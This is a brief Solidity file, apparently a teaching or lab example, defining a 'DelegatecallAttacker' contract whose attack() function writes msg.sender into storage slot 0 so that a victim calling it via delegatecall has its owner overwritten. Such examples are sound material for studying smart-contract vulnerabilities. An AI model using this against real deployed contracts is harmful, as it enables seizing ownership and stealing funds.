// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DelegatecallAttacker {
    // Same storage slot as victim.owner (slot 0)
    address public owner;

    function attack() external {
        owner = msg.sender;
    }
}
